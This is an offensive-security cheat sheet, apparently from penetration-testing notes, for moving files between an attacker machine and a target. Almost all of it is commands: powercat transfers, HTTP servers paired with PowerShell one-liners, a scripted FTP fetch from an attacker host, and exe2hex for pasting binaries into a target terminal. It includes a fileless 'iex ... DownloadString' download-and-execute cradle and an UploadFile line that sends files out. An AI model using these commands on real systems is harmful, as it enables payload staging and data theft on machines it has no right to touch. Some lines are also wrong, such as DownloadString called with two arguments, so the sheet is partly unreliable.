# Transfering files

### Powercat

```text
# source
powercat -c <ip> -p <port> -i C:\<src_path>

# destination
powercat -l -p <port> -of C:\<dst_path>
```

### HTTP server + Powershell

```text
# create server on attacker machine with one of these
python3 -m http.server <port>
python2 -m SimpleHTTPServer <port>
php -S 0.0.0.0:<port>
ruby -run -e httpd . -p <port>
busybox -f -p <port>

# download with powershell oneliner
## download file
(New-Object System.Net.WebClient).DownloadString("<source>","<destination>")

## execute powershell script without touching disk
iex (New-Object System.Net.WebClient).DownloadString("<source>")

## upload file
iex (New-Object System.Net.WebClient).UploadFile("<destination>", "<file>")
```

### pure-ftp

```text
# ftp server needs to be configured before

echo open <attacker> 21 > ftp.txt
echo user <user> >> ftp.txt
echo <pass> >> ftp.txt
echo bin >> ftp.txt
echo get <file> >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:ftp.txt
```

### exe2hex

```text
upc -9 <file>
exe2hex -x <file> -p <output>.cmd
# copy paste into target terminal
```

